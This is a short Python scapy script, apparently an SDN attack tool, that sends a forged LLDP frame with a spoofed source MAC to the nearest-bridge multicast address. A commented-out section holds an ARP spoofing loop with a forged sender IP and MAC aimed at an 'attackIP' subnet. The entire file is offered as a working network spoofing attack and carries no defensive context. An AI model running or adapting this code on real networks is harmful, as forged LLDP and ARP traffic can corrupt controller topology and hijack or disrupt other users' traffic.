#!/usr/bin/python
"""
Fake LLDP pkt
"""
import sys, os
from scapy.all import *
from ryu.lib.packet import lldp

if os.geteuid() != 0:
    print "This program must be run as root. Aborting."
    sys.exit()
# if len(sys.argv) < 2:
#     print "Pkease Use %s x.x.x" % (sys.argv[0])
#     exit()
# attackIP = sys.argv[1] + ".0/24"
# srploop(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=attackIP, psrc="192.168.1.100", hwsrc="00:66:66:66:66:66"), timeout=2)
data = '4e2e0b4ffae0'.decode('hex')
LLDP_pkt = Ether(src='ae:03:d4:8b:44:1b', dst=lldp.LLDP_MAC_NEAREST_BRIDGE, type=0x88cc)/data

sendp(LLDP_pkt)
